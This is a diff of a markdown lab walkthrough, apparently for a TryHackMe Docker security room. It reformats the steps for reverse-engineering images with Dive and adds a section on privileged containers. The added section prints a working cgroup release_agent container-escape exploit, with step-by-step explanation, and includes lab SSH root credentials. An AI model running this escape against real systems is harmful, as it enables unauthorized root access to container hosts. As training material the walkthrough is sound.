@@ -170,8 +170,9 @@ We'll be following on from the previous vulnerability outlined in Task 3. "Abusi
 As we've discovered, we are able to query the Docker registry and the data contained within without needing to authenticate. \
 Not only can we query Docker registries, but a fundamental feature of Docker is being able to download these repositories for someone to use themselves. This is known as an image; tools such as [Dive ](https://github.com/wagoodman/dive)to reverse engineer these images that we download.\
 Without doing it justice, [Dive](https://github.com/wagoodman/dive) acts as a man-in-the-middle between ourselves and Docker when we use it to run a container. Dive monitors and reassembles how each layer is created and the containers file system at each stage.\
-We'll start off with an example. Let's download a Docker image from our vulnerable repository and starting _diving_ in. \
-4.1. [Install Dive](https://github.com/wagoodman/dive#installation) from their official GitHub
+We'll start off with an example. Let's download a Docker image from our vulnerable repository and starting _diving_ in.&#x20;
+
+### [Install Dive](https://github.com/wagoodman/dive#installation) from their official GitHub
 
 **Kali**
 
@@ -181,8 +182,7 @@ curl -OL https://github.com/wagoodman/dive/releases/download/v${DIVE_VERSION}/di
 sudo apt install ./dive_${DIVE_VERSION}_linux_amd64.deb
 ```
 
-\
-4.2. Download the Docker image we are going to decompile using
+### Download the Docker image we are going to decompile using
 
 **Kali**
 
@@ -201,7 +201,7 @@ Note: If you receive this warning:`Error response from daemon: Get https://docke
 </div>
 
 \
-4.3. Find the IMAGE\_ID of the repository image that we have downloaded in Step 2:4.3.1. run `docker images` and look for the name of the repository we downloaded `docker-rodeo.thm:5000/dive/example`4.3.2. The "IMAGE\_ID" is the value in the third column:
+Find the IMAGE\_ID of the repository image that we have downloaded in Step 2:4.3.1. run `docker images` and look for the name of the repository we downloaded `docker-rodeo.thm:5000/dive/example`4.3.2. The "IMAGE\_ID" is the value in the third column:
 
 
 
@@ -223,7 +223,7 @@ dive 398736241322
 
 \
 \
-4.5. Using DiveDive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:4.5.1. Layers (pictured in red)4.5.1.1. This window shows the various layers and stages the docker container has gone through4.6.1. Current Layer Contents (pictured in green)4.6.1.1. This window shows you the contents of the container's filesystem at the selected layer4.7.1. Layer Details (pictured in red)4.7.1.1. Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.\
+Using DiveDive is a little overwhelming at first, however, it quickly makes sense. We have four different views, we are only interested in these three views:4.5.1. Layers (pictured in red)4.5.1.1. This window shows the various layers and stages the docker container has gone through4.6.1. Current Layer Contents (pictured in green)4.6.1.1. This window shows you the contents of the container's filesystem at the selected layer4.7.1. Layer Details (pictured in red)4.7.1.1. Shows miscellaneous information such as the ID of the layer and any command executed in the Dockerfile for that layer.\
 
 
 <figure><img src="https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/reversedockerimages/using-dive.png" alt=""><figcaption></figcaption></figure>
@@ -235,7 +235,7 @@ dive 398736241322
 
 
 \
-4.8. Disassembling Our First Image in DiveLooking at the "Layers" window in the top-left, we can see a total of 7 individual layers\
+Disassembling Our First Image in DiveLooking at the "Layers" window in the top-left, we can see a total of 7 individual layers\
 \
 \
 Note how we can see the commands executed by the container when the image is being built in the "Layers" panel.\
@@ -574,6 +574,166 @@ Remembering that our exploit is as follows: `nsenter --target 1 --mount sh`\
 
 
 ![](https://assets.tryhackme.com/additional/docker-rodeo/namespaces/fin.png)
+
+## Vulnerability #7: Misconfigured Privileges (Deploy #2)
+
+9.1. Understanding Capabilities
+
+At it's fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.
+
+These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:
+
+* User mode
+* Privileged mode
+
+Let's refer back to our diagram in Task 2 where we detail how containers run on the operating system to highlight the differences between these two modes:
+
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/privileged-container-layers.png)
+
+Note how containers #1 and #2 are running is "user"/"normal" mode whereas container 3 is running in "privileged" mode. Containers running in "user" mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.
+
+9.2. What does this mean for us?
+
+Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect!
+
+We can use a system package such as "libcap2-bin"'s `capsh` to list the capabilities our container has: `capsh --print` . I've highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.
+
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/listcap2.png)
+
+***
+
+9.3. Connecting to the container:
+
+Before we begin to exploit this for ourselves, you will need to deploy the new Instance attached to this Task. The vulnerabilities of the previous VM conflict with this exploit.
+
+**Kali**
+
+```
+ssh root@$VICTIM -p 2244
+Password: danny
+```
+
+
+
+Allowing a few minutes for the new Instance to deploy, I'm going to demonstrate leveraging the "sys\_admin" capability. We can confirm we have this capability by _grepping_ the output of `capsh` :
+
+**Victim**
+
+```
+capsh --print | grep sys_admin
+```
+
+<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/getcap1.png" alt=""><figcaption></figcaption></figure>
+
+This capability permits us to do multiple of things (which is listed [here](https://linux.die.net/man/7/capabilities)), but we're going to focus on the ability given to use us via "sys\_admin" to be able to [mount](https://linux.die.net/man/2/mount) files from the host OS into the container.
+
+The code snippet below is based upon (but a modified) version of the [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) where they detail the inner-workings to this exploit well.
+
+
+
+| <p>1.  mkdir /tmp/cgrp &#x26;&#x26; mount -t cgroup -o rdma cgroup /tmp/cgrp &#x26;&#x26; mkdir /tmp/cgrp/x<br>2.  echo 1 > /tmp/cgrp/x/notify_on_release<br>3.  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`<br>4.  echo "$host_path/exploit" > /tmp/cgrp/release_agent<br>5.  echo '#!/bin/sh' > /exploit<br>6.  echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit<br>7.  chmod a+x /exploit<br>8.  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"</p> |
+| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+
+```
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+9.4. Let's briefly summarise what happens here:
+
+9.4.1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system since we have capabilities to manage "cgroups" as root on the host, we'll mount this to "_/tmp/cgrp_" on the container.
+
+9.4.2. For our exploit to execute, we'll need to tell Kernel to run our code. By adding "1" to "_/tmp/cgrp/x/notify\_on\_release_", we're telling the kernel to execute something once the "cgroup" finishes. [(Paul Menage., 2004)](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
+
+9.4.3. We find out where the containers files are stored on the host and store it as a variable
+
+9.4.4. Where we then echo the location of the containers files into our "_/exploit_" and then ultimately to the "release\_agent" which is what will be executed by the "cgroup" once it is released.
+
+9.4.5. Let's turn our exploit into a shell on the host
+
+9.4.6. Execute a command to echo the host flag into a file named "flag.txt" in the container, once "_/exploit_" is executed
+
+9.4.7. Make our exploit executable!
+
+9.4.8. We create a process and store that into "_/tmp/cgrp/x/cgroup.procs_"\
+
+
+\
+9.5. Loot:
+
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit1.png)
+
+_Logging into the new Instance as "root" and executing the code snippet, resulting in container escape._
+
+\
+
+
+<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit2.png" alt=""><figcaption></figcaption></figure>
+
+_Showing that the command we executed (/exploit) has grabbed the file from the host operating system._
+
+## Determining if we're in a container
+
+### Listing running processes:
+
+Containers, due to their isolated nature, will often have very little processes running in comparison to something such as a virtual machine. We can simply use `ps aux` to print the running processes. Note in the screenshot below that there are very few processes running?
+
+<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux1.png" alt=""><figcaption></figcaption></figure>
+
+A virtual machine has a tonne more processes running in comparison. In the case of my virtual machine, there were 312 at the time of listing.
+
+<figure><img src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux2.png" alt=""><figcaption></figcaption></figure>
+
+
+
+### &#x20;Looking for .dockerenv
+
+Containers allow environment variables to be provided from the host operating system by the use of a ".dockerenv" file. This file is located in the "/" directory, and would exist on a container - even if no environment variables were provided: `cd / && ls -lah`
+
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/dockerenv.png)
+
+\
+
+
+### Those pesky cgroups
+
+Note how we utilised "cgroups" in Task 10. Cgroups are used by containerisation software such as LXC or Docker. Let's look for them with by navigating to "/proc/1" and then _catting_  the "cgroups" file...It is worth mentioning that the "cgroups" file contains paths including the word "docker":
+
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/cgroups.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
